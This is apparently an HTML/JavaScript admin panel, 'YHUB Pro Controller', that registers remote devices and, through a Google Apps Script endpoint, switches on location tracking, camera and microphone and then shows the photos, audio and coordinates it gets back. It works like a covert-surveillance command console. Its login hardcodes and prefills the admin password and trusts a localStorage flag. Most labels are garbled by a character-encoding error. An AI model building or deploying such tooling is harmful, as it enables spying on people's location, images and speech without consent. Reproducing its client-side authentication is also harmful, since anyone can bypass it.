<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YHUB Admin ‚Ä¢ Pro Controller</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background: #0a0c10; color: #e0e0e0; padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; }
        h1 { font-size: 2rem; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 1rem; border-bottom: 1px solid #30363d; padding-bottom: 0.5rem; }
        .login-box { background: #161b22; border-radius: 20px; padding: 2rem; max-width: 400px; margin: 2rem auto; border: 1px solid #30363d; }
        .login-box h2 { color: white; margin-bottom: 1.5rem; }
        .login-box input { width: 100%; padding: 12px; margin: 8px 0; background: #0d1117; border: 1px solid #30363d; border-radius: 8px; color: white; }
        .login-box button { width: 100%; padding: 12px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border: none; border-radius: 8px; color: white; font-weight: 600; cursor: pointer; }
        .device-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; margin-top: 20px; }
        .device-card { background: #161b22; border-radius: 20px; padding: 1.5rem; border: 1px solid #30363d; }
        .device-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; }
        .device-name { font-size: 1.2rem; font-weight: 600; color: white; }
        .device-code { font-size: 0.7rem; background: #0d1117; padding: 4px 8px; border-radius: 20px; color: #8b949e; }
        .status-badge { padding: 4px 12px; border-radius: 20px; font-size: 0.7rem; font-weight: 600; }
        .online { background: rgba(46, 160, 67, 0.2); color: #2ea043; border: 1px solid #2ea043; }
        .offline { background: rgba(248, 81, 73, 0.2); color: #f85149; border: 1px solid #f85149; }
        .control-group { margin: 1rem 0; display: flex; flex-direction: column; gap: 8px; }
        .btn { padding: 10px; border: none; border-radius: 30px; font-weight: 600; cursor: pointer; transition: 0.2s; }
        .btn-primary { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; }
        .btn-success { background: linear-gradient(135deg, #34d399 0%, #10b981 100%); color: white; }
        .btn-danger { background: linear-gradient(135deg, #f87171 0%, #ef4444 100%); color: white; }
        .toggle-switch { display: flex; align-items: center; justify-content: space-between; background: #0d1117; padding: 8px 12px; border-radius: 40px; margin: 4px 0; }
        .toggle-label { display: flex; align-items: center; gap: 8px; }
        .toggle-checkbox { width: 40px; height: 20px; background: #30363d; border-radius: 20px; appearance: none; cursor: pointer; position: relative; }
        .toggle-checkbox:checked { background: #238636; }
        .toggle-checkbox::before { content: ''; position: absolute; width: 16px; height: 16px; background: white; border-radius: 50%; top: 2px; left: 2px; transition: 0.2s; }
        .toggle-checkbox:checked::before { left: 22px; }
        .data-box { background: #0d1117; border-radius: 16px; padding: 1rem; margin-top: 1rem; border: 1px solid #2a2e3a; }
        .location-map iframe { width: 100%; height: 200px; border: none; border-radius: 12px; }
        .media-gallery { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 10px; }
        .media-item { width: 100px; height: 100px; border-radius: 12px; overflow: hidden; border: 2px solid #30363d; cursor: pointer; }
        .media-item img, .media-item audio { width: 100%; height: 100%; object-fit: cover; }
        .loading { display: inline-block; width: 20px; height: 20px; border: 3px solid #30363d; border-top-color: #667eea; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .footer { text-align: center; margin-top: 3rem; color: #8b949e; }
        .add-device { background: #161b22; border-radius: 16px; padding: 1.5rem; margin-top: 2rem; }
    </style>
</head>
<body>
    <div class="container" id="app">
        <!-- Login Section -->
        <div id="login-section" style="display: none;">
            <div class="login-box">
                <h2>üîê YHUB Admin Login</h2>
                <input type="text" id="username" placeholder="Username" value="yhubad">
                <input type="password" id="password" placeholder="Password" value="yhub2424">
                <button onclick="login()">Login to Dashboard</button>
                <div id="login-error" style="color: #f87171; margin-top: 1rem;"></div>
            </div>
        </div>

        <!-- Dashboard Section -->
        <div id="dashboard-section" style="display: none;">
            <h1>üì° YHUB PRO CONTROLLER</h1>
            
            <!-- Add Device -->
            <div class="add-device">
                <h3 style="color: white; margin-bottom: 1rem;">‚ûï ‡§®‡§µ‡•Ä‡§® ‡§°‡§ø‡§µ‡•ç‡§π‡§æ‡§á‡§∏ ‡•≤‡§° ‡§ï‡§∞‡§æ</h3>
                <div style="display: flex; gap: 10px;">
                    <input type="text" id="new-device-name" placeholder="‡§°‡§ø‡§µ‡•ç‡§π‡§æ‡§á‡§∏‡§ö‡•á ‡§®‡§æ‡§µ" style="flex:2; padding:12px; background:#0d1117; border:1px solid #30363d; border-radius:8px; color:white;">
                    <button onclick="addDevice()" class="btn btn-success" style="flex:1;">‡•≤‡§° ‡§ï‡§∞‡§æ</button>
                </div>
                <div id="add-result" style="margin-top: 1rem; padding: 1rem; background: #0d1117; border-radius: 8px; display: none;"></div>
            </div>

            <!-- Device List -->
            <div id="device-list" class="device-grid"></div>

            <!-- Loading -->
            <div id="loading" style="text-align: center; padding: 2rem; display: none;">
                <div class="loading"></div>
                <p style="margin-top: 1rem;">‡§°‡•á‡§ü‡§æ ‡§≤‡•ã‡§° ‡§π‡•ã‡§§ ‡§Ü‡§π‡•á...</p>
            </div>
        </div>
    </div>

    <script>
        // ---------- ‡§ï‡•â‡§®‡•ç‡§´‡§ø‡§ó‡§∞‡•á‡§∂‡§® ----------
        const GSHEET_URL = 'https://script.google.com/macros/s/AKfycbyrhp5yU-hyxrQx6OWZDKH4-qZekJgko7wRXvLOypEd-94uJfGWFp8K5DH6cI6U_XSP/exec';
        const ADMIN_USER = 'yhubad';
        const ADMIN_PASS = 'yhub2424';
        
        let devices = new Map();
        let pollingIntervals = {};

        // ---------- Login Check ----------
        (function() {
            if (localStorage.getItem('yhub_admin') === 'true') {
                showDashboard();
            } else {
                document.getElementById('login-section').style.display = 'block';
            }
        })();

        function login() {
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            
            if (user === ADMIN_USER && pass === ADMIN_PASS) {
                localStorage.setItem('yhub_admin', 'true');
                showDashboard();
            } else {
                document.getElementById('login-error').innerText = '‚ùå ‡§ö‡•Å‡§ï‡•Ä‡§ö‡•á ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§®‡•ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏!';
            }
        }

        function logout() {
            localStorage.removeItem('yhub_admin');
            location.reload();
        }

        function showDashboard() {
            document.getElementById('login-section').style.display = 'none';
            document.getElementById('dashboard-section').style.display = 'block';
            loadDevices();
        }

        // ---------- Load Devices ----------
        async function loadDevices() {
            document.getElementById('loading').style.display = 'block';
            try {
                const response = await fetch(GSHEET_URL);
                const data = await response.json();
                
                // Group by device code
                const deviceMap = new Map();
                data.forEach(row => {
                    if (row.device_code) {
                        if (!deviceMap.has(row.device_code)) {
                            deviceMap.set(row.device_code, {
                                code: row.device_code,
                                last_seen: row.timestamp,
                                records: []
                            });
                        }
                        deviceMap.get(row.device_code).records.push(row);
                    }
                });
                
                devices = deviceMap;
                renderDevices();
                
            } catch (err) {
                console.error('Load error:', err);
            } finally {
                document.getElementById('loading').style.display = 'none';
            }
        }

        // ---------- Render Devices ----------
        function renderDevices() {
            const container = document.getElementById('device-list');
            container.innerHTML = '';
            
            if (devices.size === 0) {
                container.innerHTML = '<div style="text-align:center; padding:2rem; color:#8b949e;">‡§ï‡•ã‡§£‡§§‡•á‡§π‡•Ä ‡§°‡§ø‡§µ‡•ç‡§π‡§æ‡§á‡§∏ ‡§®‡§æ‡§π‡•Ä.</div>';
                return;
            }
            
            devices.forEach((device, code) => {
                const lastRecord = device.records.length > 0 ? device.records[device.records.length - 1] : null;
                const isOnline = lastRecord && (new Date() - new Date(lastRecord.timestamp)) < 120000; // 2 minutes
                
                const card = document.createElement('div');
                card.className = 'device-card';
                card.id = `dev-${code}`;
                
                // Device specific controls
                let controls = `
                    <div class="toggle-switch">
                        <span class="toggle-label">üìç ‡§≤‡•ã‡§ï‡•á‡§∂‡§® ‡§ü‡•ç‡§∞‡•Ö‡§ï‡§ø‡§Ç‡§ó</span>
                        <input type="checkbox" class="toggle-checkbox" onchange="toggleFeature('${code}', 'location', this.checked)">
                    </div>
                    <div class="toggle-switch">
                        <span class="toggle-label">üì∏ ‡§ï‡•Ö‡§Æ‡•á‡§∞‡§æ</span>
                        <input type="checkbox" class="toggle-checkbox" onchange="toggleFeature('${code}', 'camera', this.checked)">
                    </div>
                    <div class="toggle-switch">
                        <span class="toggle-label">üé§ ‡§Æ‡§æ‡§Ø‡§ï‡•ç‡§∞‡•ã‡§´‡•ã‡§®</span>
                        <input type="checkbox" class="toggle-checkbox" onchange="toggleFeature('${code}', 'microphone', this.checked)">
                    </div>
                `;
                
                card.innerHTML = `
                    <div class="device-header">
                        <div>
                            <div class="device-name">‡§°‡§ø‡§µ‡•ç‡§π‡§æ‡§á‡§∏ #${code.slice(-4)}</div>
                            <div class="device-code">${code}</div>
                        </div>
                        <span class="status-badge ${isOnline ? 'online' : 'offline'}">${isOnline ? 'üü¢ ‡§ë‡§®‡§≤‡§æ‡§á‡§®' : 'üî¥ ‡§ë‡§´‡§≤‡§æ‡§á‡§®'}</span>
                    </div>
                    
                    <div class="control-group">
                        ${controls}
                        <button class="btn btn-danger" onclick="sendCommand('${code}', 'stop_all')">‚èπÔ∏è ‡§∏‡§∞‡•ç‡§µ ‡§¨‡§Ç‡§¶ ‡§ï‡§∞‡§æ</button>
                        <button class="btn btn-primary" onclick="getLatestData('${code}')">üìä ‡§®‡§µ‡•Ä‡§® ‡§°‡•á‡§ü‡§æ ‡§Æ‡§ø‡§≥‡§µ‡§æ</button>
                    </div>
                    
                    <div id="data-${code}" class="data-box" style="display: none;"></div>
                `;
                
                container.appendChild(card);
            });
        }

        // ---------- Toggle Features ----------
        async function toggleFeature(deviceCode, feature, enabled) {
            await sendToSheet({
                device_code: deviceCode,
                cmd_type: feature,
                status: enabled ? 'start' : 'stop'
            });
            
            if (enabled) {
                // Start polling for this device
                if (!pollingIntervals[deviceCode]) {
                    pollingIntervals[deviceCode] = setInterval(() => checkDeviceData(deviceCode), 2000);
                }
            }
        }

        // ---------- Check Device Data ----------
        async function checkDeviceData(deviceCode) {
            try {
                const response = await fetch(GSHEET_URL);
                const data = await response.json();
                
                const deviceRecords = data.filter(row => 
                    row.device_code === deviceCode && 
                    (row.photo_base64 || row.audio_base64 || (row.lat && row.lng))
                ).reverse();
                
                if (deviceRecords.length > 0) {
                    const last = deviceRecords[0];
                    const dataBox = document.getElementById(`data-${deviceCode}`);
                    dataBox.style.display = 'block';
                    
                    if (last.lat && last.lng) {
                        // Show location
                        dataBox.innerHTML = `
                            <h4 style="color:white; margin-bottom:10px;">üìç ‡§∂‡•á‡§µ‡§ü‡§ö‡•á ‡§≤‡•ã‡§ï‡•á‡§∂‡§®</h4>
                            <p>‡§Ö‡§ï‡•ç‡§∑‡§æ‡§Ç‡§∂: ${last.lat}<br>‡§∞‡•á‡§ñ‡§æ‡§Ç‡§∂: ${last.lng}</p>
                            <div class="location-map">
                                <iframe src="https://www.google.com/maps?q=${last.lat},${last.lng}&output=embed"></iframe>
                            </div>
                            <p style="margin-top:10px;">
                                <a href="https://www.google.com/maps?q=${last.lat},${last.lng}" target="_blank" style="color:#667eea;">Google Maps ‡§â‡§ò‡§°‡§æ ‚Üí</a>
                            </p>
                        `;
                    }
                    
                    if (last.photo_base64) {
                        // Show photo
                        dataBox.innerHTML += `
                            <h4 style="color:white; margin:10px 0 10px;">üì∏ ‡§´‡•ã‡§ü‡•ã</h4>
                            <img src="data:image/jpeg;base64,${last.photo_base64}" style="width:100%; border-radius:12px;" onclick="window.open(this.src)">
                        `;
                    }
                    
                    if (last.audio_base64) {
                        // Show audio
                        dataBox.innerHTML += `
                            <h4 style="color:white; margin:10px 0 10px;">üé§ ‡§ë‡§°‡§ø‡§ì</h4>
                            <audio controls style="width:100%;">
                                <source src="data:audio/webm;base64,${last.audio_base64}" type="audio/webm">
                            </audio>
                        `;
                    }
                }
            } catch (err) {
                console.error('Check error:', err);
            }
        }

        // ---------- Send Command to Sheet ----------
        async function sendToSheet(data) {
            try {
                await fetch(GSHEET_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: new URLSearchParams(data)
                });
            } catch (err) {
                console.error('Send error:', err);
            }
        }

        // ---------- Add Device ----------
        function addDevice() {
            const name = document.getElementById('new-device-name').value.trim();
            if (!name) return;
            
            const deviceCode = 'dev_' + Math.random().toString(36).substring(2, 10);
            
            sendToSheet({
                device_code: deviceCode,
                cmd_type: 'register',
                device_name: name,
                status: 'inactive'
            });
            
            document.getElementById('add-result').style.display = 'block';
            document.getElementById('add-result').innerHTML = `
                ‚úÖ ‡§°‡§ø‡§µ‡•ç‡§π‡§æ‡§á‡§∏ ‡•≤‡§° ‡§ù‡§æ‡§≤‡•á!<br>
                <strong>‡§ï‡•ç‡§≤‡§æ‡§Ø‡§Ç‡§ü URL:</strong><br>
                https://‡§§‡•Å‡§Æ‡§ö‡•á-‡§Ø‡•Ç‡§ú‡§∞‡§®‡•á‡§Æ.github.io/yhub-remote/?code=${deviceCode}<br>
                <span style="color:#8b949e;">‡§π‡•Ä URL ‡§§‡•Å‡§Æ‡§ö‡•ç‡§Ø‡§æ ‡§¶‡•Å‡§∏‡§±‡•ç‡§Ø‡§æ ‡§Æ‡•ã‡§¨‡§æ‡§à‡§≤‡§µ‡§∞ ‡§â‡§ò‡§°‡§æ.</span>
            `;
            
            setTimeout(() => loadDevices(), 2000);
        }

        // ---------- Get Latest Data ----------
        function getLatestData(deviceCode) {
            const dataBox = document.getElementById(`data-${deviceCode}`);
            dataBox.style.display = 'block';
            dataBox.innerHTML = '<div style="text-align:center;"><div class="loading"></div><p>‡§°‡•á‡§ü‡§æ ‡§Æ‡§ø‡§≥‡§µ‡§§ ‡§Ü‡§π‡•á...</p></div>';
            checkDeviceData(deviceCode);
        }

        // ---------- Logout Button ----------
        const logoutBtn = document.createElement('button');
        logoutBtn.className = 'btn btn-danger';
        logoutBtn.style.position = 'fixed';
        logoutBtn.style.top = '20px';
        logoutBtn.style.right = '20px';
        logoutBtn.style.zIndex = '1000';
        logoutBtn.innerHTML = 'üö™ ‡§≤‡•â‡§ó‡§Ü‡§â‡§ü';
        logoutBtn.onclick = logout;
        document.body.appendChild(logoutBtn);
    </script>
</body>
</html>
